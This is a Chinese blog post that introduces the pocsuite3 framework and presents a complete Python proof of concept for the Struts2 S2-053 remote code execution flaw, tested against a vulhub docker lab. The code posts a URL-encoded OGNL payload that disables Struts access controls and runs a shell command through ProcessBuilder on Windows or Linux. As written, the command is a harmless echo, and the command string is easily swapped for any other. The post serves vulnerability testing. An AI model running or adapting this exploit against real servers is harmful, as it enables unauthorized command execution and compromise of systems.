---
title: 基于pocsuite3框架下的Struts2远程代码执行poc
tags:
  - Python
categories:
  - Python
copyright: true
abbrlink: b5617bde
date: 2019-12-27 14:34:18
---
0x00 **pocsuite介绍**

Pocsuite 是由知道创宇404实验室打造的一款开源的远程漏洞测试框架。  
windows下安装 命令 pip3 install pocsuite3  
然后在cmd下输入pocsuite，如图所示成功安装。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191227114528480.png)
0x01Struts2_053POC

    
    
    # -*- coding:utf-8 -*-
    
    from pocsuite3.api import Output, POCBase, register_poc, requests, logger
    from pocsuite3.api import get_listener_ip, get_listener_port
    from pocsuite3.api import REVERSE_PAYLOAD
    from urllib.parse import urljoin
    from pocsuite3.lib.utils import random_str
    
    
    class DemoPOC(POCBase):
        vulID = "CVE-2017-12611"
        version ='2.0.1-2.3.33,2.5-2.5.10'
        author = ["php00py"]
        vulDate = "2019-12-27"
        createDate = "2019-12-27"
        updateDate = "2019-12-27"
        references =["https://vulhub.org/#/environments/struts2/s2-053/"]
        name ="S2-053 Remote Code Execution Vulnerablity"
        appPowerLink = ''
        appName = 'Strute2'
        appVersion = '2.x'
        vulType = 'RCE'
        desc = '''
        struts2-053远程代码执行漏洞
        '''
        samples = []
        install_requires = ['']
    
        def _verify(self):
            result ={}
            path ="/hello.action"
            url = urljoin(self.url, path)
            payload = "redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo+%22php00py%22%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A"
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0',
                        'Content-Type': 'application/x-www-form-urlencoded'
                        }
            rr = requests.post(url=url,headers=headers,data=payload)
            try:
                if "php00py" in rr.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Name'] = payload
            except Exception as e:
                pass
            return self.parse_output(result)
    
        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output
    
        def _attack(self):
            return self._verify()
    register_poc(DemoPOC)
    
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191227142944646.png)
环境是自己用docker搭建的环境。  
https://github.com/vulhub/vulhub/tree/master/struts2/s2-053

0x03 **pocsuite开发说明**

https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md

